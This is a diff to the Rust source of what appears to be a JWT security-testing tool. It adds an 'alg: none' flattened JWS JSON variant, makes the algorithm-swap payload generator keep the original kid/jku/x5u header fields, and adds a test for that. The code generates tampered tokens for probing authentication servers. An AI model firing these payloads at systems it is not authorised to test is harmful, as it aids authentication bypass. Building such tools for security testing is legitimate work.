@@ -855,9 +855,11 @@ pub fn generate_jwk_embed_ec_payload(token: &str) -> Result<String> {
 /// RFC 7515 §7.2.2 defines `{"protected":..., "payload":..., "signature":...}`
 /// as an alternative to the compact `h.p.s` encoding. Servers that auto-detect
 /// based on first byte may parse this without applying compact-form-only
-/// validation paths. Two variants: passthrough of the original parts, and a
+/// validation paths. Three variants: passthrough of the original parts, a
 /// downgrade where `protected` carries `alg: none` (signature kept as the
-/// original bytes, which a `none`-honouring lib will not actually verify).
+/// original bytes, which a `none`-honouring lib will not actually verify),
+/// and a Flattened variant that adds an unprotected `header` with `alg: none`
+/// alongside the original `protected` header.
 pub fn generate_jws_json_payload(token: &str) -> Result<Vec<String>> {
     let parts: Vec<&str> = token.split('.').collect();
     if parts.len() < 2 {
@@ -907,12 +909,17 @@ pub fn generate_jws_json_payload(token: &str) -> Result<Vec<String>> {
     Ok(payloads)
 }
 
-/// Generate PS↔RS cross-family `alg` swaps that preserve the original signature.
+/// Generate cross-family `alg` swaps (RS↔PS, ES curves, HS hash sizes).
 ///
-/// Libraries that pick a verifier from `alg` but accept any RSA key shape may
-/// be tricked into running an RSASSA-PKCS1-v1_5 signature through an RSASSA-PSS
-/// verifier (or vice versa). The original token's signature is retained — the
-/// server's verifier choice is the side under test.
+/// **This is a differential-response probe, not a forged token.** The original
+/// signature was computed over the *original* signing input; this generator
+/// only swaps `alg`, so under any correct implementation verification will
+/// fail. The value is in observing *how* the server fails — e.g. a 500 vs 401
+/// or a different error message can reveal that the verifier was selected
+/// based on the new `alg` (RSASSA-PSS instead of PKCS1-v1_5, ES384 instead of
+/// ES256, …) before signature verification, leaking which code path is wired
+/// up. All other header fields (`kid`, `jwk`, `jku`, `x5u`, etc.) are
+/// preserved so the server still locates the same verification key.
 pub fn generate_alg_family_swap_payload(token: &str) -> Result<Vec<String>> {
     let parts: Vec<&str> = token.split('.').collect();
     if parts.len() < 2 {
@@ -921,6 +928,14 @@ pub fn generate_alg_family_swap_payload(token: &str) -> Result<Vec<String>> {
     let claims_part = parts[1];
     let original_sig = parts.get(2).copied().unwrap_or("");
     let source_alg = original_alg(token).unwrap_or_else(|| "RS256".to_string());
+
+    // Decode the original header so we can preserve kid/jwk/jku/x5u/etc.
+    let original_header_b64 = parts[0];
+    let original_header: serde_json::Value =
+        match general_purpose::URL_SAFE_NO_PAD.decode(original_header_b64) {
+            Ok(bytes) => serde_json::from_slice(&bytes).unwrap_or_else(|_| json!({ "typ": "JWT" })),
+            Err(_) => json!({ "typ": "JWT" }),
+        };
 
     // (target alg) variants depending on source family.
     let targets: &[&str] = match source_alg.to_uppercase().as_str() {
@@ -942,7 +957,15 @@ pub fn generate_alg_family_swap_payload(token: &str) -> Result<Vec<String>> {
 
     let mut payloads = Vec::with_capacity(targets.len());
     for &target in targets {
-        let header = json!({ "alg": target, "typ": "JWT" });
+        let mut header = original_header.clone();
+        match header.as_object_mut() {
+            Some(map) => {
+                map.insert("alg".to_string(), json!(target));
+            }
+            None => {
+                header = json!({ "alg": target, "typ": "JWT" });
+            }
+        }
         let header_b64 = general_purpose::URL_SAFE_NO_PAD
             .encode(serde_json::to_string(&header).unwrap().as_bytes());
         payloads.push(format!("{header_b64}.{claims_part}.{original_sig}"));
@@ -2023,6 +2046,38 @@ mod tests {
             })
             .collect();
         assert!(algs.iter().any(|a| a == "HS384" || a == "HS512"));
+    }
+
+    #[test]
+    fn test_generate_alg_family_swap_preserves_original_header_fields() {
+        // Token whose header carries kid + jku in addition to alg/typ.
+        let header = json!({
+            "alg": "RS256",
+            "typ": "JWT",
+            "kid": "real-key-2024",
+            "jku": "https://example.com/.well-known/jwks.json",
+        });
+        let header_b64 = URL_SAFE_NO_PAD.encode(serde_json::to_string(&header).unwrap().as_bytes());
+        let token = format!("{header_b64}.eyJzdWIiOiJ4In0.OrIginalSig");
+
+        let payloads = generate_alg_family_swap_payload(&token).expect("swap ok");
+        assert!(!payloads.is_empty());
+        for p in &payloads {
+            let h = get_header_from_token(p).expect("decodable header");
+            // alg must have changed.
+            assert_ne!(h.get("alg").and_then(|v| v.as_str()), Some("RS256"));
+            // kid and jku must be preserved verbatim.
+            assert_eq!(
+                h.get("kid").and_then(|v| v.as_str()),
+                Some("real-key-2024"),
+                "kid must be preserved across alg swaps"
+            );
+            assert_eq!(
+                h.get("jku").and_then(|v| v.as_str()),
+                Some("https://example.com/.well-known/jwks.json"),
+                "jku must be preserved across alg swaps"
+            );
+        }
     }
 
     #[test]
